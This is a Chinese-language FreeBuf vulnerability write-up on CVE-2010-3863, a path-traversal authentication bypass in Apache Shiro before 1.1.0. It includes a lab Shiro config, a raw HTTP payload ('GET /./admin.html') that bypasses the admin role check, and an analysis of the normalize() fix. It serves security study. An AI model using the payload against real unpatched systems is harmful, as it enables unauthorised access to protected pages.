---
title: shiro-web CVE-2010-3863 路径绕过
url: https://www.freebuf.com/vuls/414113.html
source: FreeBuf网络安全行业门户
date: 2025-01-08
fetch_date: 2025-10-06T20:10:07.537754
---

# shiro-web CVE-2010-3863 路径绕过

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

shiro-web CVE-2010-3863 路径绕过

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

shiro-web CVE-2010-3863 路径绕过

2025-01-07 15:16:03

所属地 广东省

[condition] < shiro 1.1.0

## 背景

1. 如果对shiro-web的原理不清楚可以参考以下链接：[shiro-web 软件分析](https://www.freebuf.com/articles/web/414108.html)
2. 发送URL前，浏览器本身会对``` ../``./ ```这类路径进行处理，将其还原成实际路径，然后才会发送请求。

```
【url栏】http://ip:port/test/../admin.html   ---> 【请求包】 http://ip:port/admin.html
```

但是，可以拦截请求包，对URL进行篡改

## 漏洞环境

<https://github.com/dota-st/vulnEnv>

文件结构：

![image](https://image.3001.net/images/20241030/1730283058_67220632c5245363a932f.png!small)

主要配置文件：

realm.ini:

![image](https://image.3001.net/images/20241030/1730283086_6722064e6a5367bb8b55e.png!small)

ShiroConfig:

```
package com.vuln.shirodemo.Shiro;

import java.util.LinkedHashMap;
import org.apache.shiro.realm.Realm;
import org.apache.shiro.realm.text.IniRealm;
import org.apache.shiro.spring.web.ShiroFilterFactoryBean;
import org.apache.shiro.web.mgt.DefaultWebSecurityManager;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

/**
 * Created by dotast on 2022/10/14 15:13
 */
@Configuration
public class ShiroConfig {

    @Bean
    public IniRealm getIniRealm(){
        return new IniRealm("classpath:realm.ini");
    }

    @Bean
    public DefaultWebSecurityManager getDefaultWebSecurityManager(Realm realm){
        return new DefaultWebSecurityManager(realm);
    }

    /*
     * anon：无需认证就可以访问
     * authc：必须认证才能访问
     * user：必须拥有记住我功能才能访问
     * perms：拥有某个资源的权限才能访问
     * role：拥有某个角色的权限才能访问
     * */
    @Bean
    ShiroFilterFactoryBean getShiroFilterFactoryBean(DefaultWebSecurityManager defaultWebSecurityManager) {
        ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean();
        bean.setSecurityManager(defaultWebSecurityManager);
        bean.setLoginUrl("/login.html");
        LinkedHashMap<String, String> map = new LinkedHashMap<String, String>();
        map.put("/admin.html", "authc, roles[admin]");
        map.put("/user.html", "authc, roles[user]");
        map.put("/**", "anon");
        bean.setFilterChainDefinitionMap(map);
        return bean;
    }
}
```

## 漏洞分析

**payload**:

```
GET /./admin.html HTTP/1.1
Host: localhost:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

:shiro-web整体流程

![SequenceDiagram1.png](https://image.3001.net/images/20250107/1736234130_677cd49237290e30ea267.png!small)

> 红色部分为漏洞点
> 详情：[shiro-web 软件分析](https://www.freebuf.com/articles/web/414108.html)

### 代码分析

PathMatchingFilterChainResolver.getChain(...):

![image](https://image.3001.net/images/20241030/1730283167_6722069fee6e1847221a4.png!small)

> 局部变量
>
> ![image](https://image.3001.net/images/20241030/1730283204_672206c4a4fe9f04469ce.png!small)可以看出没有做任何过滤，直接获取url
>
> ![image](https://image.3001.net/images/20241030/1730283287_6722071789c685c2857e5.png!small)
>
> 配置文件里设置的FilterChain的名字序列

最终匹配到`/**`：
该链只有anon:AnonymousFilter一个过滤器

![image](https://image.3001.net/images/20241030/1730283315_672207339f08c0f1a384d.png!small)

Anonymous的过滤逻辑：允许任何人通过

![image](https://image.3001.net/images/20241030/1730283329_672207418c2692025618e.png!small)

## 漏洞修复

如果是我，我会如何修复？

当然是像浏览器那样，将带有`../`的路径规范化后再进行比较，比较逻辑不变

**实际修复**

shiro-1.1.0:

1. request中url没有变
   ![image](https://image.3001.net/images/20241030/1730283351_67220757618e71c7d868d.png!small)
2. 但是requstURI 被规范化了
   ![image](https://image.3001.net/images/20241030/1730283422_6722079e216006406abc4.png!small)
   所以一定是getPathWithApplication(request)内部逻辑发生改变了
   最后不断跟进找到：

```
//org.apache.shiro.web.util.WebUtils::

//shiro-1.0.1-incubating
public static String getRequestUri(HttpServletRequest request) {
        String uri = (String) request.getAttribute(INCLUDE_REQUEST_URI_ATTRIBUTE);
        if (uri == null) {
            uri = request.getRequestURI();
        }
        return decodeAndCleanUriString(request, uri);
    }

//shiro-1.1.0
public static String getRequestUri(HttpServletRequest request) {
    String uri = (String)request.getAttribute("javax.servlet.include.request_uri");
    if (uri == null) {
        uri = request.getRequestURI();
    }

    return normalize(decodeAndCleanUriString(request, uri));
}
```

![image](https://image.3001.net/images/20241030/1730283445_672207b5552ccdcbfb53c.png!small)
添加了一个`normalize`函数

```
private static String normalize(String path, boolean replaceBackSlash) {
        if (path == null) {
            return null;
        } else {
            String normalized = path;
            //'\' ASCII 是 92
            if (replaceBackSlash && normalized.indexOf(92) >= 0) {
                normalized = normalized.replace('\\', '/');
            }

            if (normalized.equals("/.")) {
                return "/";
            } else {
                if (!normalized.startsWith("/")) {
                    normalized = "/" + normalized;
                }

                while(true) {
                    int index = normalized.indexOf("//");
                    if (index < 0) {
                        while(true) {
                            index = normalized.indexOf("/./");
                            if (index < 0) {
                                while(true) {
                                    index = normalized.indexOf("/../");
                                    if (index < 0) {
                                        return normalized;
                                    }

                                    if (index == 0) {
                                        return null;
                                    }
// ‘/’ ASCII :47
                                    int index2 = normalized.lastIndexOf(47, index - 1);
                                    //循环去除 ‘/../’
                                    normalized = normalized.substring(0, index2) + normalized.substring(index + 3);
                                }
                            }
							//循环去除 ‘/./’
                            normalized = normalized.substring(0, index) + normalized.substring(index + 2);
                        }
                    }
					//循环去‘//’
                    normalized = normalized.substring(0, index) + normalized.substring(index + 1);
                }
            }
        }
    }
```

**Reference**

[JavaSec/12.Shiro/CVE-2010-3863权限绕过/index.md at main · Y4tacker/JavaSec (github.com)](https://github.com/Y4tacker/JavaSec/blob/main/12.Shiro/CVE-2010-3863%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/index.md)

# 漏洞分析 # Java代码审计

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

背景

漏洞环境

漏洞分析

* 代码分析

漏洞修复

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/proje...